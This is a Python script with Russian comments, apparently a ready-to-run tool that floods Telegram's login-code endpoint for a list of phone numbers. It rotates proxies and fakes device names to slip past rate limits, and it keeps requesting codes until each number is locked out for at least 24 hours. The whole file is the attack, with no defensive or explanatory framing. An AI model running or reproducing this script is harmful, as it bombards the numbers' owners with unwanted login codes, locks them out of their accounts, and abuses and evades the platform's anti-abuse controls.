import asyncio
import itertools
import random
import string
import time

loop = asyncio.new_event_loop()
asyncio.set_event_loop(loop)

from pyrogram import Client
from pyrogram.errors import FloodWait, PhoneNumberFlood, PhoneNumberBanned, PhoneNumberInvalid

API_ID = 2040
API_HASH = "b18441a1ff607e10a989891a5462e627"


def load_proxies(path="proxies.txt"):
    import re
    proxies = []
    for line in open(path, encoding="utf-8").read().splitlines():
        line = line.strip()
        if not line or line.startswith("#"):
            continue
        m = re.match(
            r"(?P<scheme>socks5|http|https)://"
            r"(?:(?P<user>[^:@]+):(?P<password>[^@]+)@)?"
            r"(?P<host>[^:]+):(?P<port>\d+)",
            line, re.IGNORECASE
        )
        if not m:
            raise ValueError(f"Не могу разобрать прокси: {line!r}")
        proxies.append({
            "scheme": m.group("scheme").lower(),
            "hostname": m.group("host"),
            "port": int(m.group("port")),
            "username": m.group("user") or "",
            "password": m.group("password") or "",
        })
    if not proxies:
        raise ValueError(f"Нет прокси в {path}")
    return proxies

_proxies = load_proxies()
_proxy_cycle = itertools.cycle(_proxies)
_proxy_lock = None

def load_phones(path="phones.txt"):
    phones = []
    for line in open(path, encoding="utf-8").read().splitlines():
        line = line.strip()
        if line and not line.startswith("#"):
            if not line.startswith("+"):
                line = "+" + line
            phones.append(line)
    if not phones:
        raise ValueError(f"Нет номеров в {path}")
    return phones

PHONES = load_phones()

TARGET_FLOOD_HOURS = 24
CHECK_THRESHOLD = 120


def rnd_device():
    prefix = random.choice(["DESKTOP", "LAPTOP", "PC", "WORKSTATION"])
    suffix = "".join(random.choices(string.ascii_uppercase + string.digits, k=6))
    return f"{prefix}-{suffix}"


def fmt_time(secs):
    h = secs // 3600
    m = (secs % 3600) // 60
    s = secs % 60
    return f"{h}ч {m}м {s}с"


def log(phone, msg):
    ts = time.strftime("%H:%M:%S")
    print(f"[{ts}] [{phone}] {msg}")


async def send_once(phone, n):
    async with _proxy_lock:
        proxy = next(_proxy_cycle)
    client = Client(
        f"s{phone[-7:]}_{n}",
        api_id=API_ID,
        api_hash=API_HASH,
        device_model=rnd_device(),
        in_memory=True,
        proxy=proxy,
        no_updates=True,
    )
    try:
        await client.connect()
        await client.send_code(phone)
        await client.disconnect()
        return "OK", 0
    except FloodWait as e:
        try: await client.disconnect()
        except: pass
        return "FLOOD", e.value
    except PhoneNumberFlood:
        try: await client.disconnect()
        except: pass
        return "PHONE_FLOOD", 0
    except PhoneNumberBanned:
        try: await client.disconnect()
        except: pass
        return "BANNED", 0
    except PhoneNumberInvalid:
        try: await client.disconnect()
        except: pass
        return "INVALID", 0
    except Exception as e:
        try: await client.disconnect()
        except: pass
        return f"ERROR:{type(e).__name__}:{e}", 0


async def wait_flood(phone, attempt_ref, flood_secs):
    """
    Ждёт флуд. Спокойно ждёт пока не останется CHECK_THRESHOLD секунд,
    потом начинает проверять с нарастающей частотой.
    Возвращает ('OK' | 'BANNED', 0) или ('FLOOD', new_secs) если поймал новый флуд.
    """
    current_flood = flood_secs

    while True:
        end_time = time.monotonic() + current_flood

        # Фаза 1 — тихо ждём пока не останется CHECK_THRESHOLD секунд
        while True:
            remaining = int(end_time - time.monotonic())
            if remaining <= CHECK_THRESHOLD:
                break
            await asyncio.sleep(5)

        # Фаза 2 — проверяем с нарастающей частотой
        while True:
            remaining = int(end_time - time.monotonic())

            if remaining > 20:
                pause = 5
            elif remaining > 5:
                pause = 1
            else:
                pause = 0  # спам без паузы

            attempt_ref[0] += 1
            s, f = await send_once(phone, attempt_ref[0])

            if s == "OK":
                log(phone, f"  [#{attempt_ref[0]}] OK — флуд снят! (осталось ~{remaining}s)")
                return "OK", 0
            elif s == "FLOOD":
                log(phone, f"  [#{attempt_ref[0]}] FLOOD = {f}s ({fmt_time(f)}) | осталось ~{remaining}s")
                if f > current_flood:
                    # Флуд вырос — возвращаем его наверх
                    return "FLOOD", f
                else:
                    # Флуд уменьшился — обновляем и продолжаем ждать
                    current_flood = f
                    end_time = time.monotonic() + f
            elif s == "BANNED":
                log(phone, f"  [#{attempt_ref[0]}] BANNED")
                return "BANNED", 0
            else:
                log(phone, f"  [#{attempt_ref[0]}] {s}")

            if pause > 0:
                await asyncio.sleep(pause)


async def worker(phone):
    target_secs = TARGET_FLOOD_HOURS * 3600
    attempt = [0]
    done = False

    log(phone, f"Старт. Цель: флуд >= {TARGET_FLOOD_HOURS}ч")

    while not done:
        attempt[0] += 1
        status, flood_secs = await send_once(phone, attempt[0])

        if status == "OK":
            log(phone, f"[#{attempt[0]}] OK — код отправлен")
            await asyncio.sleep(1)

        elif status == "FLOOD":
            log(phone, f"[#{attempt[0]}] FLOOD = {flood_secs}s ({fmt_time(flood_secs)})")

            if flood_secs >= target_secs:
                unlock_ts = time.time() + flood_secs
                unlock_str = time.strftime("%d.%m %H:%M", time.localtime(unlock_ts))
                log(phone, f"*** ЦЕЛЬ ДОСТИГНУТА! Флуд {fmt_time(flood_secs)} ***")
                log(phone, f"    Разблокировка: {unlock_str}")
                done = True
                break

            result, new_flood = await wait_flood(phone, attempt, flood_secs)

            if result == "OK":
                log(phone, "  Продолжаю...")
                await asyncio.sleep(0.5)
            elif result == "FLOOD":
                log(phone, f"[!] Флуд вырос до {fmt_time(new_flood)}")
                if new_flood >= target_secs:
                    unlock_ts = time.time() + new_flood
                    unlock_str = time.strftime("%d.%m %H:%M", time.localtime(unlock_ts))
                    log(phone, f"*** ЦЕЛЬ ДОСТИГНУТА! Флуд {fmt_time(new_flood)} ***")
                    log(phone, f"    Разблокировка: {unlock_str}")
                    done = True
                # Иначе — снова идём в wait_flood через следующую итерацию while
            elif result == "BANNED":
                log(phone, "Номер заблокирован, стоп.")
                done = True

        elif status == "PHONE_FLOOD":
            log(phone, f"[#{attempt}] PHONE_FLOOD — жду 60s")
            await asyncio.sleep(60)

        elif status == "BANNED":
            log(phone, f"[#{attempt}] BANNED — номер заблокирован, стоп")
            done = True

        elif status == "INVALID":
            log(phone, f"[#{attempt}] INVALID — неверный номер, стоп")
            done = True

        else:
            log(phone, f"[#{attempt}] {status} — жду 10s")
            await asyncio.sleep(10)

    log(phone, "Завершён.")


async def main():
    global _proxy_lock
    _proxy_lock = asyncio.Lock()
    print("=" * 60)
    print(f"Запускаю {len(PHONES)} номеров | {len(_proxies)} прокси")
    print("=" * 60)
    await asyncio.gather(*[worker(phone) for phone in PHONES])
    print("=" * 60)
    print("Все номера обработаны.")
    print("=" * 60)


loop.run_until_complete(main())
